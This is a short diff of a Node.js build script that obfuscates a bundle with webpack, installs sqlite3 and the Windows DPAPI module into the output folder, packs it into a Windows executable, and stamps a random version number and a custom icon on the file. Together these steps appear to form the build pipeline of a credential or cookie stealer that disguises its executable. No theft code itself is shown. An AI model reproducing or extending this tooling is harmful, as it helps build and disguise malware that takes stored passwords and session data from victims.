@@ -194,11 +194,13 @@ console.log('');
   execSync('npx webpack', { stdio: 'pipe' });
   console.log('Done minifying and obfuscating.');
 
-  execSync(`npm install sqlite3 electron @primno/dpapi --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' });
+  await new Promise((r) => r(execSync(
+    `npm install sqlite3 @primno/dpapi --production --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' }
+  )));
 
   console.log('Building electron executable...');
 
-  new Promise((r) => r(execSync(`npx pkg dist/index.bundle.js -c -t node18-win-x64 -C GZip -o "${config.filename}.exe"`, { stdio: 'inherit' }))).then(async () => {
+  new Promise((r) => r(execSync(`npx pkg . -C GZip -o "${config.filename}.exe"`, { stdio: 'inherit' }))).then(async () => {
     const version = `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`;
     await rcedit(`${config.filename}.exe`, {
       icon,
